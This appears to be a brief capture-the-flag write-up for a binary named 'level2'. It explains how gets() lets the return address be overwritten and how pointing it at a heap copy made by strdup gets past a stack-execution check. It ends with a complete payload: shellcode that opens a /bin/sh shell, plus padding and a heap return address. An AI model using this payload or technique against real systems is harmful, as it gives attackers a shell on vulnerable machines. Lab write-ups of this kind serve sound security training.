1. We saw that the program call gets, that is known for buffer overflow flaw
2. There is a protection that check the EIP value and check if the value point in the stack (stack execution prevetion)
   This mean that we cannot inject and read code in the stack
3. After in the program, our input in stack is dup in the HEAP.
4. We looked at the address returned by strdup and it pass through the protection
5. So we built a payload to infect the EIP function to exec our code in the heap.
6. Here is a payload sample : (perl -e 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80". "1"x25 . "\x08\xa0\x04\x08"'; cat) | ./level2
